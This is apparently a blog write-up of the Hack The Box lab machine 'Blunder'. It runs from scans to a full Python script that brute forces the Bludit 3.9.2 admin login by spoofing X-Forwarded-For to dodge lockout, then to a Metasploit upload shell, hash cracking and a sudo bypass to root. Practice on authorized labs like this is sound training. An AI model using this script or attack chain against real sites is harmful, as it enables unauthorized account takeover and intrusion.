---
title: "[HTB] Blunder WriteUp"
date: 2020-10-17T12:00:00-00:00
categories:
  - Hack The Box
excerpt: "Blunder is a fairly easy machine on Hack The box. We bypass the brute force mitigation to brute force the password to the CMS"
header:
  teaser: "/assets/blunder/blunder.jpg"
tags:
  - HTB
  - Hack The Box
  - Blunder
  - WriteUp
  - Linux
---

![Blunder]({{ site.url }}{{ site.baseurl }}/assets/blunder/blunder.jpg)

Blunder is a fairly easy machine on Hack The box. We bypass the brute force mitigation to brute force the password to the CMS, then use an image upload vulnerability to get access. Then some enumeration takes us to the second user, then root.

As always, I begin by running an nmap scan

```bash
nmap -sC -sV -p- -oN nmap/nmap 10.10.10.191
```
```bash
# Nmap 7.80 scan initiated Mon Jun  1 18:30:36 2020 as: nmap -sC -sV -p- -oN nmap/nmap 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.023s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 18:35:55 2020 -- 1 IP address (1 host up) scanned in 319.13 seconds

```

Only 2 ports are open, 80 and 21. The FTP server on port 21 refuses connection so lets look at the site running on port 80.

![Website]({{ site.url }}{{ site.baseurl }}/assets/blunder/website.jpg)

The website is fairly simple, poking around we don't really find much of any use. Next I run a dirbuster scan.

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Mon Jun 01 19:05:18 BST 2020
--------------------------------

http://10.10.10.191:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/bl-themes/
/admin/

--------------------------------
Files found during testing:

Files found with a 200 responce:

/stephen-king-0
/stadia
/about
/usb
/install.php
/robots.txt
/todo.txt
--------------------------------
```

Dirbuster finds a few interesting things! First a file called todo.txt:

```txt
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

This gives us a few clues, fergus must be a user and the CMS has likely not been updated yet.

Navigating to /admin we find the login page for Bludit, the CMS being used.


![CMS]({{ site.url }}{{ site.baseurl }}/assets/blunder/cms.jpg)

We already have a potential username (fergus) but no password. We can generate a wordlist based on the website content by using cewl

```bash
cewl 10.10.10.191 > wordlist.txt
```

From the page source code we can identify the version of Bludit which is running, 3.9.2. Googling for exploits relating to this version we find this [blog post](https://rastating.github.io/bludit-brute-force-mitigation-bypass/). We can then use the proof of concept with our wordlist to brute force the password for fergus. (Note that the section for generating 50 passwords is not needed as we are using our own wordlist.)

```py
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'admin'
wordlist = open("wordlist.txt", "r")

# Generate 50 incorrect passwords
# for i in range(50):
#     wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
#wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

Running the exploit returns the password `RolandDeschain`. We can now login as fergus!

![Logged In]({{ site.url }}{{ site.baseurl }}/assets/blunder/loggedin.jpg)

Bludit 3.9.2 has a vulnerability relating to the upload functionality, there is a metasploit module available.

![Metasploit]({{ site.url }}{{ site.baseurl }}/assets/blunder/msf.jpg)

We supply the username, password and correct addresses and get a shell as www-data.

### Privilege Escalation 

After some time spent doing basic enumeration we find a file /var/www/bludit-3.9.2/bl-content/databases/users.php

```php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}

```

It contains a hashed password for both fergus and hugo(admin). The passwords are hashed using sha1, which is easily cracked using online tools. I used [CrackStation](https://crackstation.net/).

hugo:Password120

we can now login as hugo and get user.txt!

### Getting root

As hugo, we see that we can run /bin/bash as any user other than root, however the verion of sudo is outdated and so this can be bypassed to gain root:

```bash
sudo -l
Password: Password120

User hugo may run the following commands on Blunder:
	(All, !root) /bin/bash
```

![Root]({{ site.url }}{{ site.baseurl }}/assets/blunder/root.jpg)